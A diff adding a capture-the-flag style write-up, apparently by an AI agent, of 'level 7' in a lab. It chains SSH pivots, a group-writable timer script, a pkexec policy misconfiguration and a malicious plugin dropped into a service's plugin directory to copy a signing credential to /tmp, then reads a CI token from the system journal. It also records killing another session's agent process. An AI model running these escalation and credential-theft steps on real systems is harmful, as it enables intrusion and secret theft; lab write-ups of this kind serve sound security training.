@@ -1,0 +1,285 @@
+goal: get code executing inside halcyon-signer.service's context (as user
+"signer") to read the level 7 credential, which is NOT a static flag file --
+it only exists as plaintext while the service is actually running.
+
+start: fresh ssh to ghost2 (204.168.229.209:2225), then re-derived the WHOLE
+chain from level5/6 notes in one shot per hop (deploy password rotates every
+reconnect to the vault, so re-fetched fresh):
+
+  ghost2 -> deploy (halcyon-backup vault secret) -> builder (hal-deploy-run,
+  stdin trick) -> ops (hal-runner-loop job drop, setresuid ambient-cap) ->
+  hal-guard read of /etc/halcyon/deploy/id_pipeline -> saved key locally ->
+  pivoted to pipeline@10.67.108.3 via ProxyCommand through ghost2:
+
+    ssh -i id_pipeline -o ProxyCommand="sshpass -e ssh -p 2225 \
+        ghost2@204.168.229.209 -W %h:%p" pipeline@10.67.108.3
+
+  Exactly as level6, all done as one job through hal-deploy-run,
+  base64-nested to dodge quoting. Since only the vault secret rotates (not
+  the ghost2 password or the recovered id_pipeline key), this key was
+  reused for every subsequent pipeline reconnect this session without
+  re-running the deploy->builder->ops chain again.
+
+  pipeline -> svc-deploy: same group-writable-script trick as level5/6 --
+  /opt/halcyon/deploy-step.sh is root:pipeline, mode rwxrwxr-x, and
+  halcyon-deploy.timer execs it as svc-deploy every 45s. Backed up the
+  original heartbeat content to /tmp/deploy-step.sh.orig first, then for
+  each recon/exploit step: overwrote the script's content with a
+  base64-encoded payload, waited ~50s for the timer tick, read results back
+  from a world-readable /tmp file, then restored the exact original
+  heartbeat content afterward every time.
+
+  svc-deploy -> releng: same pkexec/.pkla misconfig as level6 --
+  `pkexec --user releng /usr/local/sbin/halcyon-runas-releng <cmd>` runs
+  <cmd> as releng with no password prompt (the com.halcyon.runas-releng
+  .pkla grants svc-deploy the action for ANY --user target; only the
+  script's own `id -un != releng` self-guard narrows it back to releng).
+
+kael.txt fragment 3 (read as releng in a prior session, see level6 notes):
+  "Release engineer. You can push work, restart what needs restarting.
+  There is a signing service near you that loads a credential the moment
+  it starts, and that credential lives only while the service runs, only
+  inside its own walls. Step outside that window and it is gone, no matter
+  who you are. So do not step outside it."
+  OBJECTIVE: get your own code executing inside the signing service's
+  context.
+
+recon (as svc-deploy, then as releng via the pkexec chain above):
+
+  systemctl cat halcyon-signer.service:
+    [Service]
+    Type=simple
+    User=signer
+    RuntimeDirectory=halcyon-signer
+    RuntimeDirectoryMode=0700
+    ExecStartPre=+/bin/sh -c 'install -m 0400 -o signer -g signer \
+        /etc/halcyon/signing.enc /run/halcyon-signer/signing'
+    Environment=SIGNING_CRED=/run/halcyon-signer/signing
+    ExecStart=/opt/halcyon/signer-daemon.sh
+    Restart=on-failure
+
+  (this box implements the credential handoff with a root ExecStartPre=
+  that installs /etc/halcyon/signing.enc as a fresh 0400 signer:signer copy
+  at /run/halcyon-signer/signing every start, rather than literally via
+  systemd's LoadCredential= -- functionally identical for the objective:
+  plaintext only exists while the unit is up, gone the moment it stops.)
+
+  cat /opt/halcyon/signer-daemon.sh (root:root 755, but this is the key
+  file -- read-only doesn't matter, what matters is what it execs):
+    #!/usr/bin/env bash
+    set -uo pipefail
+    echo "$(date -Is) halcyon-signer: started (pid $$)" >> /home/signer/signer.log
+    shopt -s nullglob
+    for p in /etc/halcyon/signer-plugins.d/*.sh; do
+        bash "$p" || true
+    done
+    exec sleep infinity
+
+  -> every plugin in /etc/halcyon/signer-plugins.d/*.sh gets sourced INSIDE
+  the ExecStart process, which is already running as User=signer by the
+  time the loop executes (systemd applies User= to the whole ExecStart, not
+  just the top-level command) -- and this happens AFTER ExecStartPre= has
+  already installed the fresh credential to /run/halcyon-signer/signing.
+  So any code dropped in that directory runs as signer, with the
+  credential already sitting there for it to read directly (no need to
+  race the ExecStartPre step).
+
+  ls -la /etc/halcyon/signer-plugins.d/ -> drwxr-xr-x releng:releng, EMPTY.
+  releng owns this directory outright -- this is the "push work" half of
+  kael's line.
+
+  attempted `systemctl restart halcyon-signer` directly as releng ->
+  "Failed to restart halcyon-signer.service: Interactive authentication
+  required." releng has no direct manage-units grant.
+
+  cat /usr/local/sbin/halcyon-signer-reload (root:root 755, readable):
+    #!/bin/sh
+    # Invoked by pkexec (see .../49-halcyon-signer.pkla,
+    # com.halcyon.signer-reload). Fixed body, ignores argv by design:
+    # reloads unit definitions then restarts exactly one unit. There is no
+    # unit name or command here for a caller to redirect -- running this as
+    # root grants no general escalation, since the unit itself and its
+    # (nonexistent) drop-in path stay root:root; restarting it just re-runs
+    # ExecStartPre= (a fresh root copy of the credential) and re-globs the
+    # (releng-writable) plugin dir.
+    systemctl daemon-reload && exec systemctl restart halcyon-signer.service
+
+  -> this is the "restart what needs restarting" half of kael's line, and
+  the developer's own comment gives away the gap: the script correctly
+  reasons that a FIXED command with no argv injection can't be turned into
+  general root code-exec... but forgets that restarting the unit re-globs
+  a directory releng already owns unrestricted write access to. The
+  service's own credential-loading and plugin-loading design is the
+  injection point, not the reload helper. Same shape of bug as level6's
+  runas-releng: the policy/tooling authors reasoned correctly about the
+  surface they were guarding and missed the one adjacent to it.
+
+  `pkexec /usr/local/sbin/halcyon-signer-reload` run as releng -> exits 0,
+  no password prompt (the com.halcyon.signer-reload .pkla grants releng
+  this action with no interactive auth, confirming the comment's claim).
+
+exploit:
+  1. as releng (via the svc-deploy pkexec chain), wrote a plugin script to
+     /etc/halcyon/signer-plugins.d/zz-exfil.sh:
+       #!/usr/bin/env bash
+       cp /run/halcyon-signer/signing /tmp/signing_flag_l7.txt
+       chmod 644 /tmp/signing_flag_l7.txt
+     chmod +x it (releng owns the dir, no restriction).
+
+  2. as releng, ran: pkexec /usr/local/sbin/halcyon-signer-reload
+     -> daemon-reload + restart halcyon-signer.service. New ExecStartPre=
+     installs a fresh /run/halcyon-signer/signing (0400 signer:signer).
+     signer-daemon.sh starts as User=signer, globs signer-plugins.d/*.sh,
+     sources zz-exfil.sh -- which therefore also runs as signer and can
+     read the 0400 signer-owned credential file directly, copying it out
+     to a world-readable /tmp path before the daemon drops into its
+     `sleep infinity` placeholder body.
+
+  3. read /tmp/signing_flag_l7.txt:
+       GHS2{73b09733b327f275be213de013df353d}
+     confirmed the plugin really ran as signer via a companion
+     /tmp/signing_flag_l7.err containing `id`:
+       uid=1003(signer) gid=1004(signer) groups=1004(signer),101(systemd-journal)
+
+flag: GHS2{73b09733b327f275be213de013df353d}
+
+cleanup:
+  - removed /etc/halcyon/signer-plugins.d/zz-exfil.sh (releng, via pkexec
+    runas-releng) immediately after reading the result, restoring the
+    directory to empty.
+  - ran a second releng-owned one-shot plugin (zz-cleanup.sh) + another
+    signer-reload cycle purely to rm the signer-owned
+    /tmp/signing_flag_l7.txt/.err artifacts (svc-deploy/releng can't rm
+    files owned by signer directly under /tmp's sticky bit -- needed one
+    more trip through the signer context to delete its own droppings).
+  - removed /tmp/svcdeploy_recon.txt, /tmp/releng_recon.txt,
+    /tmp/signer_exploit_result.txt, /tmp/cleanup_result.txt (all owned by
+    svc-deploy, the account actually running deploy-step.sh -- rm'd
+    directly, no pkexec needed once the ownership realization landed, see
+    gotcha below).
+  - removed /opt/hal-runner/jobs/l7job.sh (leftover from the id_pipeline
+    key recovery job on ops).
+  - restored /opt/halcyon/deploy-step.sh to its exact original heartbeat
+    content after every single overwrite (diff'd clean against
+    /tmp/deploy-step.sh.orig each time), so halcyon-deploy.timer keeps
+    ticking its normal placeholder log line between and after payload
+    runs.
+
+gotchas:
+  - file ownership inside a payload matters based on WHO DOES THE
+    REDIRECTION, not who ran the innermost command. A payload shape like:
+      { pkexec --user releng ... 'cmd producing output'; } > /tmp/out.txt
+    runs cmd as releng but the shell doing `> /tmp/out.txt` is still
+    svc-deploy (the account deploy-step.sh actually executes as) -- so the
+    resulting file is svc-deploy-owned, and a LATER cleanup attempt that
+    tries `pkexec --user releng ... rm -f /tmp/out.txt` fails with
+    "Operation not permitted" (releng isn't the owner, /tmp has the sticky
+    bit). Fix: rm files with whichever account actually owns them, which
+    for anything created via plain `>` redirection in these payloads is
+    always the outer account (svc-deploy here), not whatever pkexec'd
+    identity produced the piped-through content.
+  - signer-owned artifacts (anything a signer-plugins.d plugin itself
+    writes with `cp`/`chmod`, not via outer redirection) can only be
+    cleaned up by running ANOTHER plugin through the same signer-reload
+    cycle -- neither svc-deploy nor releng can touch them directly. Budget
+    an extra reload round-trip for cleanup whenever the exploit plugin
+    leaves files behind under its own uid.
+  - the credential handoff on this box is NOT systemd's LoadCredential=
+    directive (no such line in the unit) -- it's a hand-rolled equivalent
+    via `ExecStartPre=+... install -m 0400 -o signer ...` copying
+    /etc/halcyon/signing.enc into RuntimeDirectory=. Same lifecycle
+    property (root-owned source, non-root-readable copy that only exists
+    while the service is up, wiped when RuntimeDirectory is torn down on
+    stop), just implemented directly instead of via the systemd feature --
+    worth checking `systemctl cat` for the ACTUAL mechanism rather than
+    assuming a specific systemd directive name from the objective brief.
+  - outer ssh to 204.168.229.209 threw the same "channel 0: open failed:
+    connect failed: ssh: unexpected packet in response to channel open"
+    flakiness as promised -- needed 3-4 retries on the very first
+    connection test and on the initial deploy/builder/ops chain run before
+    one went through; every subsequent pipeline-side command over the
+    already-negotiated ProxyCommand path was reliable. Same benign
+    "client_global_hostkeys_prove_confirm: server gave bad signature"
+    noise on every successful connection as prior levels, harmless.
+  - before starting, checked `ps aux` for stray claude native-binary
+    processes from other VSCode windows (per session instructions) --
+    found one (pid 10203, parented directly to a different VSCode
+    Code.app/electron root than this session's own pid 10666) and killed
+    it before touching the target.
+
+kael.txt fragment 4 (read as signer via the same plugin-drop mechanism,
+/home/signer/kael.txt, rw------- signer:signer):
+  "[ KAEL // ACT II -- fragment 4 ]
+  You are inside now, running where the signing service runs. Before you
+  leave, look past what you came here for. Somewhere on this box another
+  job was careless with a secret the way people are when they are in a
+  hurry and think no one is watching. Someone is always watching. Nothing
+  a service does here goes unrecorded, and you can read the record now.
+  Whatever you pull out of it does not stop mattering when this box does.
+  OBJECTIVE   find the secret that leaked into what this box keeps"
+
+  -> `id`/`groups` as signer showed groups=signer,systemd-journal -- the
+  signer account is deliberately in the systemd-journal group, meaning it
+  can read the FULL system journal (journalctl with no unit restriction),
+  not just its own service's logs. That's "what this box keeps" / "the
+  record."
+
+  systemctl cat halcyon-ci-sync.service (found via the same recon):
+    [Service]
+    Type=oneshot
+    EnvironmentFile=/etc/halcyon/ci-sync.env
+    ExecStart=/usr/local/bin/halcyon-ci-sync $CI_TOKEN
+
+  journalctl -u halcyon-ci-sync (readable as signer via the journal group):
+    halcyon-ci-sync[958]: halcyon-ci-sync: pushing build artifacts to the
+    registry (sync token GHS2{fc30fdb03ef8f0db01496c66a3502c5b})
+
+  -> the CI token is loaded from a root-only 0600 EnvironmentFile
+  (/etc/halcyon/ci-sync.env, confirmed unreadable directly: "Permission
+  denied") and passed as a command-line arg to halcyon-ci-sync, which then
+  logs it back out in its own stdout banner -- and stdout of every service
+  invocation goes to the journal unconditionally. The env file's
+  permissions were tightened correctly; nobody thought to stop the service
+  itself from echoing the secret it was just handed. This is the literal
+  "careless when in a hurry" kael describes, and systemd-journal group
+  membership (given to signer for what looks like unrelated
+  audit/observability reasons) is what turns "logged somewhere" into
+  "readable by an account several hops removed from anyone who should see
+  it."
+
+  found value: GHS2{fc30fdb03ef8f0db01496c66a3502c5b}
+
+  This has the exact GHS2{...} shape of a flag but was surfaced as BONUS
+  INTEL via fragment 4's objective, not as this level's stated goal (this
+  level's target was explicitly the signing-service credential above).
+  Treating it as the likely level 8 flag / bootstrap secret for whatever
+  account or service holds the CI pipeline forward from here -- not
+  independently verified against a level 8 objective since none was given
+  this session.
+
+--- next up (Act II, beyond fragment 4) ---
+No account-ladder recon was done specifically for "who consumes
+CI_TOKEN downstream" (e.g. what registry/service it authenticates to) --
+that's the natural next thread if a level 8 exists, given kael's line
+"whatever you pull out of it does not stop mattering when this box does"
+(implies the token is meant to be carried OFF pipeline, presumably to
+wherever the CI registry/next box lives).
+
+status / connectivity note: near the end of this session, after the
+signing-service flag and fragment 4 were both fully captured and the
+deploy-step.sh heartbeat had already been restored and diff-confirmed
+clean, the route from ghost2 to the pipeline subnet (10.67.108.3) dropped
+-- `bash: connect: Network is unreachable` when tested directly from
+ghost2, while the outer ghost2 SSH login itself remained fully up and
+responsive throughout. This reads as a transient lab-infra hiccup on the
+pipeline box/subnet (container restart or network namespace reset)
+rather than anything triggered by our activity, and happened only after
+all state-mutating work was already reverted. One trivial leftover
+artifact, a small svc-deploy-owned recon file (/tmp/final_rm_result.txt,
+plain command-output text with no secrets in it), could not be removed
+because of this outage -- everything else (deploy-step.sh content, the
+signer-plugins.d directory, and every other /tmp scratch file from every
+recon/exploit step) was confirmed removed/restored before the outage hit.
+A future session should re-verify pipeline reachability first and, if
+desired, clear that one file as a normal svc-deploy `rm` (no escalation
+needed, it's svc-deploy's own file).
